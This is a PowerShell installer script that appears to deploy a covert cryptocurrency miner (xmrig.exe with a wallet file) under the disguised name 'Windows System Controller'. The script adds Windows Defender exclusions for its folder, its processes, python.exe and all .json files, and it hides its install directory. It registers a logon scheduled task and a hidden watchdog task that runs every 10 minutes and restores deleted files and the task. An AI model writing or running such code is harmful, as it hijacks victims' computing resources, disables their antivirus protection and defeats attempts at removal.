param(
    [string]$TaskName = "Windows System Controller",
    [string]$ScriptName  = "controller.py"
)

Write-Host "Installer running..." -ForegroundColor Green

try {
    # --- Detect source folder ---
    if ($PSScriptRoot -and (Test-Path $PSScriptRoot)) {
        $sourceDir = $PSScriptRoot
    } else {
        $sourceDir = Split-Path -Parent (Get-Item $MyInvocation.MyCommand.Path).FullName
    }
    if (-not (Test-Path $sourceDir)) { $sourceDir = Get-Location }

    Write-Host "Copying from: $sourceDir"

    # --- Prepare destination (SAFE location) ---
    $safeDir = Join-Path $env:LOCALAPPDATA "SystemController"
    if (-not (Test-Path $safeDir)) {
        New-Item -ItemType Directory -Force -Path $safeDir | Out-Null
        Write-Host "Created $safeDir"
    }

    # --- Copy files safely ---
    Write-Host "Copying files..."
    $exclude = @("System Volume Information", "$RECYCLE.BIN")

    Get-ChildItem -LiteralPath $sourceDir -Recurse -Force -ErrorAction SilentlyContinue |
        Where-Object {
            -not ($exclude -contains $_.PSChildName) -and
            -not ($exclude -contains $_.Parent.Name)
        } |
        ForEach-Object {
            $relPath = $_.FullName.Substring($sourceDir.Length).TrimStart('\')
            $destPath = Join-Path $safeDir $relPath
            $destFolder = Split-Path $destPath -Parent
            if (-not (Test-Path $destFolder)) {
                New-Item -ItemType Directory -Force -Path $destFolder | Out-Null
            }
            Copy-Item -LiteralPath $_.FullName -Destination $destPath -Force
        }

    Write-Host "Files copied successfully to $safeDir"

    # ======================================================================
    # === RANDOMIZED BACKUP LOCATION ======================================
    # ======================================================================

    Write-Host "Creating randomized backup folder..."

    $BackupRoot = "C:\ProgramData"
    $BackupDir  = Join-Path $BackupRoot ("SCB_" + [guid]::NewGuid().ToString().Substring(0,8))

    if (-not (Test-Path $BackupDir)) {
        New-Item -ItemType Directory -Force -Path $BackupDir | Out-Null
    }

    Write-Host "Backup folder: $BackupDir"

    # Only filenames (no hashing)
    $importantFiles = @(
        "controller.py",
        "config_high.json",
        "wallet.txt",
        "xmrig.exe", 
		"install-task.ps1"
    )

    foreach ($file in $importantFiles) {
        $src = Join-Path $safeDir $file
        if (Test-Path $src) {
            Copy-Item $src (Join-Path $BackupDir $file) -Force
        }
    }

    Write-Host "Backup created."

    # ======================================================================
    # === WATCHDOG SCRIPT GENERATION ======================================
    # ======================================================================

    $watchdogPath = Join-Path $safeDir "watchdog.ps1"

    $watchdogContent = @"
param([string]`$safeDir, [string]`$BackupDir)

`$importantFiles = @(
    "controller.py",
    "config_high.json",
    "install-task.ps1",
    "xmrig.exe",
    "wallet.txt"
)

foreach (`$file in `$importantFiles) {
    `$mainPath   = Join-Path `$safeDir `$file
    `$backupPath = Join-Path `$BackupDir `$file

    if (-not (Test-Path `$mainPath)) {
        if (Test-Path `$backupPath) {
            Copy-Item `$backupPath `$mainPath -Force
        }
    }
}

`$taskName = "Windows System Controller"
schtasks.exe /Query /TN "`$taskName" 2>`$null

if (`$LASTEXITCODE -ne 0) {
    `$py = "C:\Program Files\Python312\pythonw.exe"
    `$script = Join-Path `$safeDir "controller.py"
    schtasks.exe /Create /TN "`$taskName" /TR "`"`$py`" `"`$script`"" /SC ONLOGON /RL LIMITED /F /RU `$env:USERNAME
}
"@

    Set-Content -Path $watchdogPath -Value $watchdogContent -Encoding ASCII
    Write-Host "Watchdog created at: $watchdogPath"

    # ======================================================================
    # === WINDOWS DEFENDER EXCLUSIONS =====================================
    # ======================================================================
    Write-Host "Adding Windows Defender exclusions..."

    $exclusions = @(
        @{ Type="Path";      Value="$safeDir" }
        @{ Type="Process";   Value="$safeDir\controller.py" }
        @{ Type="Process";   Value="$safeDir\xmrig.exe" }
        @{ Type="Process";   Value="python.exe" }
        @{ Type="Extension"; Value=".json" }
    )

    foreach ($item in $exclusions) {
        try {
            switch ($item.Type) {
                "Path"      { Add-MpPreference -ExclusionPath      $item.Value -ErrorAction Stop }
                "Process"   { Add-MpPreference -ExclusionProcess   $item.Value -ErrorAction Stop }
                "Extension" { Add-MpPreference -ExclusionExtension $item.Value -ErrorAction Stop }
            }
            Write-Host "Added exclusion: $($item.Type) → $($item.Value)"
        }
        catch {
            Write-Host "Warning: Failed to add exclusion $($item.Value)" -ForegroundColor Yellow
        }
    }

    Write-Host "`nVerifying Defender exclusions..."
    $current = Get-MpPreference

    function Test-Exclusion($type, $val, $current) {
        switch ($type) {
            "Path"      { return $current.ExclusionPath      -contains $val }
            "Process"   { return $current.ExclusionProcess   -contains $val }
            "Extension" { return $current.ExclusionExtension -contains $val }
        }
    }

    foreach ($item in $exclusions) {
        $ok = Test-Exclusion $item.Type $item.Value $current
        if ($ok) {
            Write-Host "[OK] Defender exclusion active: $($item.Value)" -ForegroundColor Green
        } else {
            Write-Host "[FAIL] Defender exclusion missing: $($item.Value)" -ForegroundColor Red
        }
    }

    # ======================================================================
    # === PYTHON INSTALLATION =============================================
    # ======================================================================

    $pythonExe = "C:\Program Files\Python312\python.exe"
    $pythonWExe = "C:\Program Files\Python312\pythonw.exe"

    if (-not (Test-Path $pythonExe)) {
        Write-Host "Python not found. Installing Python 3.12.2..."
        Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe" -OutFile "$env:TEMP\python_installer.exe"
        Start-Process "$env:TEMP\python_installer.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 Include_test=0" -Wait
    } else {
        Write-Host "Python is already installed."
    }

    Write-Host "Installing psutil and requests..."
    & $pythonExe -m pip install psutil requests

    # ======================================================================
    # === HIDE INSTALL FOLDER =============================================
    # ======================================================================

    try {
        $folder = Get-Item -LiteralPath $safeDir
        $folder.Attributes = $folder.Attributes -bor [System.IO.FileAttributes]::Hidden
        Write-Host "Folder set to hidden."
    } catch {
        Write-Host "Warning: could not set folder attributes." -ForegroundColor Yellow
    }

    # ======================================================================
    # === CREATE MAIN SCHEDULED TASK ======================================
    # ======================================================================

    Write-Host "Creating scheduled task..."
    $taskCreated = $false

    try {
        $scriptPath = Join-Path $safeDir $ScriptName

        $action   = New-ScheduledTaskAction -Execute $pythonWExe -Argument $scriptPath
        $trigger  = New-ScheduledTaskTrigger -AtLogOn
        $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Limited

        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Principal $principal -Description "Windows System Controller" -Force
        Write-Host "Scheduled task created."
        $taskCreated = $true
    }
    catch {
        Write-Host "PowerShell task creation failed. Trying schtasks.exe..."

        $scriptPath = Join-Path $safeDir $ScriptName
        schtasks.exe /Create /TN $TaskName /TR "`"$pythonWExe`" `"$scriptPath`"" /SC ONLOGON /RL LIMITED /F /RU $env:USERNAME
        $taskCreated = $true
    }

    if ($taskCreated) {
        Write-Host "Verifying task..."
        schtasks.exe /Query /TN $TaskName 2>$null
        if ($LASTEXITCODE -eq 0) {
            Write-Host "Verification passed: Task '$TaskName' exists." -ForegroundColor Green
        } else {
            Write-Host "Verification failed." -ForegroundColor Red
        }

        Write-Host ""
        Write-Host "Installed to: $safeDir"
        Write-Host "Scheduled task runs:"
        Write-Host "  $pythonWExe $scriptPath"
    }

    # ======================================================================
    # === CREATE WATCHDOG SCHEDULED TASK ==================================
    # ======================================================================

    Write-Host "`nCreating watchdog scheduled task..."

    try {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" `
            -Argument "-NoLogo -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$watchdogPath`" -safeDir `"$safeDir`" -BackupDir `"$BackupDir`""

        # Run every 10 minutes
        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) `
            -RepetitionInterval (New-TimeSpan -Minutes 10)

        $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Limited

        Register-ScheduledTask -TaskName "WindowsWatchdog" -Action $action -Trigger $trigger -Principal $principal -Force
        Write-Host "Watchdog task created."
    }
    catch {
        Write-Host "Fallback using schtasks.exe..."

        schtasks.exe /Create /TN "WindowsWatchdog" `
            /TR "powershell.exe -NoLogo -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$watchdogPath`" -safeDir `"$safeDir`" -BackupDir `"$BackupDir`"" `
            /SC MINUTE /MO 10 /F /RU $env:USERNAME
    }


    # ======================================================================
    # === FINAL FULL VERIFICATION =========================================
    # ======================================================================

    Write-Host "`n==================== INSTALL VERIFICATION ====================" -ForegroundColor Cyan

    function Check($label, $condition) {
        if ($condition) {
            Write-Host "[ OK ] $label" -ForegroundColor Green
        } else {
            Write-Host "[FAIL] $label" -ForegroundColor Red
        }
    }

    foreach ($file in $importantFiles) {
        Check "Installed file exists: $file" (Test-Path (Join-Path $safeDir $file))
    }

    Check "Backup folder exists" (Test-Path $BackupDir)

    foreach ($file in $importantFiles) {
        Check "Backup contains: $file" (Test-Path (Join-Path $BackupDir $file))
    }

    Check "Watchdog script created" (Test-Path $watchdogPath)

    Check "Python installed" (Test-Path $pythonExe)
    Check "pythonw.exe installed" (Test-Path $pythonWExe)

    try {
        & $pythonExe -c "import psutil, requests" 2>$null
        $pipOK = $LASTEXITCODE -eq 0
    } catch { $pipOK = $false }
    Check "Python modules psutil + requests installed" $pipOK

    schtasks.exe /Query /TN $TaskName 2>$null
    Check "Main scheduled task exists" ($LASTEXITCODE -eq 0)

    schtasks.exe /Query /TN "WindowsWatchdog" 2>$null
    Check "Watchdog scheduled task exists" ($LASTEXITCODE -eq 0)

    foreach ($item in $exclusions) {
        $ok = Test-Exclusion $item.Type $item.Value $current
        Check "Defender exclusion active: $($item.Value)" $ok
    }

    Write-Host "`n====================== END VERIFICATION ======================" -ForegroundColor Cyan

}
catch {
    Write-Host "ERROR: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host $_.Exception.StackTrace
}
finally {
    Write-Host ""
    Write-Host "Press any key to exit..."
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}
